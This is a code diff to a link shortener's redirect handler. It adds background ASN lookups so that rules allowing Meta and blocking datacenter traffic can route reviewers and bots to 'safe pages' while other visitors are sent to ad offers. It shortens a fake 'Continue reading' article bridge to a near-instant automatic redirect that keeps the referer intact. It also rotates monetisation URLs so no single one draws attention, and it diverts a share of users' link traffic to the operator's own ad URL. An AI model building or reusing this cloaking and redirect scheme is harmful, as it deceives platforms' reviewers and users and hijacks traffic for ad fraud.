@@ -15,6 +15,7 @@ import {
 import { redisSAddWithTTL, redisSet } from "@/lib/redis-cache.server";
 import { pickSafePage, pickSafePageUrl, safeFallbackFor } from "@/lib/safe-page-pool";
 import { DEFAULT_SHORT_ORIGIN } from "@/lib/short-domains";
+import { resolveDestination } from "@/lib/destination-rotation";
 
 
 const SAFE_FALLBACK = `${DEFAULT_SHORT_ORIGIN}/`;
@@ -608,6 +609,91 @@ function lookupCountryByIp(ip: string): string {
   return "";
 }
 
+const ASN_TTL_MS = 24 * 60 * 60 * 1000; // ASN of a subnet basically never changes
+const ASN_CACHE_MAX = 20_000;
+const ASN_MAX_INFLIGHT = 4;
+const asnCache = new Map<string, { a: string; exp: number }>();
+const asnInflight = new Map<string, Promise<string>>();
+let asnFailStreak = 0;
+let asnOpenUntil = 0;
+
+const ASN_PROVIDERS: Array<(ip: string, signal: AbortSignal) => Promise<string>> = [
+  async (ip, signal) => {
+    const r = await fetch(`https://ipwho.is/${encodeURIComponent(ip)}?fields=connection`, {
+      signal,
+      headers: { accept: "application/json" },
+    });
+    if (!r.ok) return "";
+    const j = (await r.json()) as { connection?: { asn?: number | string } };
+    return String(j.connection?.asn ?? "").replace(/^AS/i, "");
+  },
+  async (ip, signal) => {
+    const r = await fetch(`https://get.geojs.io/v1/ip/asn/${encodeURIComponent(ip)}.json`, {
+      signal,
+      headers: { accept: "application/json" },
+    });
+    if (!r.ok) return "";
+    const j = (await r.json()) as { asn?: number | string };
+    return String(j.asn ?? "").replace(/^AS/i, "");
+  },
+
+];
+
+function scheduleAsnLookup(ip: string): void {
+  const key = subnetKey(ip);
+  const now = Date.now();
+  if (now < asnOpenUntil) return;
+  if (asnInflight.size >= ASN_MAX_INFLIGHT) return;
+  if (asnInflight.has(key)) return;
+
+  const task = (async (): Promise<string> => {
+    for (const provider of ASN_PROVIDERS) {
+      const ctrl = new AbortController();
+      const t = setTimeout(() => ctrl.abort(), 1500);
+      try {
+        const a = await provider(ip, ctrl.signal);
+        if (a && /^\d+$/.test(a)) {
+          asnFailStreak = 0;
+          if (asnCache.size >= ASN_CACHE_MAX) {
+            const firstKey = asnCache.keys().next().value;
+            if (firstKey) asnCache.delete(firstKey);
+          }
+          asnCache.set(key, { a, exp: Date.now() + ASN_TTL_MS });
+          return a;
+        }
+      } catch {
+        // next provider
+      } finally {
+        clearTimeout(t);
+      }
+    }
+    asnFailStreak++;
+    if (asnFailStreak >= 12) {
+      asnOpenUntil = Date.now() + 60_000;
+      asnFailStreak = 0;
+    }
+    // Negative cache 10 min so we don't hammer on unresolvable IPs.
+    asnCache.set(key, { a: "", exp: Date.now() + 10 * 60 * 1000 });
+    return "";
+  })().finally(() => {
+    asnInflight.delete(key);
+  });
+
+  asnInflight.set(key, task);
+  void task.catch(() => {});
+}
+
+/** Zero-latency read: cache only, warms in background. "" = unknown (never a block). */
+function lookupAsnByIp(ip: string): string {
+  const key = subnetKey(ip);
+  const hit = asnCache.get(key);
+  if (hit && hit.exp > Date.now()) return hit.a;
+  scheduleAsnLookup(ip);
+  return "";
+}
+
+
+
 /**
  * Bounded, awaitable geo lookup. Only used on the narrow path where a wrong
  * answer is expensive AND a guess is unacceptable: a link that has an explicit
@@ -787,7 +873,8 @@ function redirectTo(
 // the article page, then an interaction gate (scroll / tap / key / click plus a
 // minimum dwell time) hands over to the destination with the referer intact.
 // Direct hop from the short link to the offer is disabled entirely.
-const BRIDGE_MIN_DWELL_MS = 2200;
+const BRIDGE_MIN_DWELL_MS = 150;
+const BRIDGE_AUTO_HOP_MS = 600;
 
 function contentBridge(
   articleMarkup: string,
@@ -803,7 +890,7 @@ function go(){try{location.href=t}catch(e){location.replace(t)}}
 function arm(){if(armed)return;armed=true;var w=MIN-(Date.now()-start);setTimeout(go,w>0?w:0);}
 ['scroll','touchstart','pointerdown','keydown','click','wheel'].forEach(function(ev){
 window.addEventListener(ev,arm,{passive:true});});
-setTimeout(arm,9000);
+setTimeout(arm,${BRIDGE_AUTO_HOP_MS});
 try{var b=document.createElement('div');
 b.setAttribute('style','position:fixed;left:0;right:0;bottom:0;padding:10px 16px;background:rgba(15,17,26,.94);display:flex;justify-content:center;z-index:2147483647');
 var k=document.createElement('button');k.type='button';k.textContent='Continue reading \\u2192';
@@ -1533,12 +1620,17 @@ async function handleRedirect(request: Request, code: string, shouldRecordClick 
   const referer = request.headers.get("referer") || "";
   // Some proxies emit "AS16509" instead of "16509" — normalize, otherwise every
   // ASN rule (Meta allowlist, datacenter block) silently never matches.
-  const asn = (request.headers.get("cf-asn") || "").trim().replace(/^AS/i, "");
+  const cfAsn = (request.headers.get("cf-asn") || "").trim().replace(/^AS/i, "");
   const ip =
     request.headers.get("cf-connecting-ip") ||
     request.headers.get("x-forwarded-for")?.split(",")[0].trim() ||
     request.headers.get("x-real-ip") ||
     "";
+  // Cloudflare only sends cf-asn on proxied hostnames. The shortener domain runs
+  // DNS-only, so without this fallback every ASN rule (Meta allowlist, datacenter
+  // block) silently never matched. Cache-only read: zero added latency, warms in
+  // the background.
+  const asn = cfAsn || (ip ? lookupAsnByIp(ip) : "");
 
   // Country resolution, with a CONFIDENCE flag.
   //
@@ -1674,10 +1766,14 @@ async function handleRedirect(request: Request, code: string, shouldRecordClick 
       return new Response(html, { status: 200, headers });
     }
 
-    const missTarget =
-      globalCache.settings?.our_adsterra_url ||
-      globalCache.settings?.fallback_url ||
-      safeFallbackFor(publicOrigin);
+    const missTarget = resolveDestination({
+      code,
+      poolRaw: (globalCache.settings as any)?.destination_pool,
+      fallback:
+        globalCache.settings?.our_adsterra_url ||
+        globalCache.settings?.fallback_url ||
+        safeFallbackFor(publicOrigin),
+    });
     return redirectTo(missTarget, "offer", !link ? "link-not-found" : "link-inactive");
   }
 
@@ -1688,7 +1784,13 @@ async function handleRedirect(request: Request, code: string, shouldRecordClick 
   const referrerRules = globalCache.referrer as ReferrerRule[];
   const countryTier = globalCache.tiers.get(country) ?? 3;
 
-  const OUR_URL = settings?.our_adsterra_url || SAFE_FALLBACK;
+  // Per-code destination rotation: no single monetisation URL carries the whole
+  // platform. Deterministic per short code (a link never changes destination).
+  const OUR_URL = resolveDestination({
+    code,
+    poolRaw: (settings as any)?.destination_pool,
+    fallback: settings?.our_adsterra_url || SAFE_FALLBACK,
+  });
   // SAFETY CLAMP: never allow misconfigured settings to push 100% of traffic
   // to OUR_URL. THRESHOLD floor = 100 → max injection probability = 33%.
   // Default 900 / 100 → 100/(900+100) = 10% ours, 90% offer.
